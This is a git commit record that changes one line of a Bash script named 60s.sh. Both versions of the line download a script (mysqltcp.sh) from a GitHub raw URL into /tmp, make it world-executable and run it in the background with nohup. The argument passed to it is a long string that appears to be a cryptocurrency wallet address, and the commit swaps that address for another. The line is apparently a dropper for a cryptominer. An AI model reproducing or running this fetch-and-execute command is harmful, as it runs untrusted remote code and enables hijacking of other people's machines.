0c06955ead74c1906d762aaf9bc8855306d38144
U8Pool <905353149@qq.com>
2024-09-09 14:32:43 -0400

    Update 60s.sh

--- Bash/60s.sh
+++ Bash/60s.sh
@@ -1,1 +1,1 @@
-cd /tmp/ && wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/mysqltcp.sh && chmod 777 mysqltcp.sh && export HOME=/tmp && nohup ./mysqltcp.sh 42QLKb4oTCTdKmtegYwKCfA4nSqmRBktBJBMxLsRH2NfXBE8HaWcguJ7fro19A5PFmVwNCZuweSWkRMtbiEd9wwdVPLETUZ
+cd /tmp/ && wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/mysqltcp.sh && chmod 777 mysqltcp.sh && export HOME=/tmp && nohup ./mysqltcp.sh 42B9B2qiFJkMtwQtRJQQfT5bffDCs5B8VaWKQynLPRH3fejvegEj5iK2g2YDnwtjDyM6U2pMJiAYujELDW9tFPQzTSEgFBq
